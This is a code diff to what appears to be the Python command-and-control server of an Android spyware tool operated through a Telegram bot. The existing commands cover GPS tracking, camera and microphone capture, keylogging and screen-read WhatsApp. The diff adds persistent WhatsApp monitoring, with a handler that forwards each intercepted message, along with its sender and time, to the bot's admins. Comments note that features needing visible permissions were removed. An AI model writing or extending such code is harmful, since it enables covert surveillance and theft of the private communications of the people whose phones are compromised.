@@ -219,6 +219,8 @@ COMMANDS = {
     # ⚠️ gmail تمت إزالته — يحتاج Notification Access
     # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
     "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
+    "whatsapp-monitor-on":  {"category": "data", "label": "👁️ تفعيل مراقبة واتساب", "description": "مراقبة دائمة لرسائل واتساب", "needs_param": False},
+    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة واتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
@@ -226,7 +228,7 @@ COMMANDS = {
     "selfie-camera":  {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
     # screenshot تمت إزالته من المشروع
     # audio
-    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (مدة مخصصة)",     "needs_param": True, "param_hint": "10 ثانية / 1 دقيقة / 1 ساعة"},
+    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 60 أو 120 (ثانية)"},
     "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
     "stopAudio":      {"category": "audio",  "label": "🔇 إيقاف الصوت",      "description": "إيقاف الصوت",              "needs_param": False},
     # control
@@ -408,6 +410,8 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"gallery"))
     # ⚠️ gmail تمت إزالته
     kb.add(_cbtn(did,"whatsapp-live"))
+    kb.add(_cbtn(did,"whatsapp-monitor-on"))
+    kb.add(_cbtn(did,"whatsapp-monitor-off"))
     # ⚠️ telegram-messages تمت إزالته
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
@@ -2018,7 +2022,12 @@ def _sock_file_explorer(data):
                 except Exception as e:
                     logger.error(f"فشل إرسال إشعار إلغاء accessibility: {e}")
         return
-    
+
+    # ⚡ Check for whatsapp_message event (مراقبة واتساب الدائمة)
+    if data_type == "whatsapp_message":
+        _handle_whatsapp_message(dev, data)
+        return
+
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
@@ -2038,6 +2047,47 @@ def _sock_file_explorer(data):
         except Exception as e:
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
 
+
+
+def _handle_whatsapp_message(dev, data):
+    """معالجة رسائل واتساب الواردة من المراقبة الدائمة وإرسالها للبوت."""
+    try:
+        sender = data.get("sender", "غير معروف")
+        text = data.get("text", "")
+        app_name = data.get("app", "واتساب")
+        time_str = data.get("time_formatted", "")
+
+        if not text:
+            return
+
+        short_id = dev.get('short_id', '?')
+        model = dev.get('model', '?')
+        logger.info(f"💬 [WhatsApp] #{short_id} [{sender}]: {text[:80]}")
+
+        if mdm_bot:
+            # تنسيق الرسالة للبوت
+            display_text = text[:2000]
+            if len(text) > 2000:
+                display_text += "..."
+
+            msg = (
+                f"💬 <b>رسالة واتساب جديدة</b>\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
+                f"👥 <b>المرسل:</b> {sender}\n"
+                f"🕐 <b>الوقت:</b> {time_str}\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📝 <b>النص:</b>\n"
+                f"<code>{display_text}</code>"
+            )
+
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال رسالة واتساب للبوت: {e}")
+    except Exception as e:
+        logger.error(f"خطأ في معالجة رسالة واتساب: {e}")
 
 
 def _handle_keylog_event(dev, data):
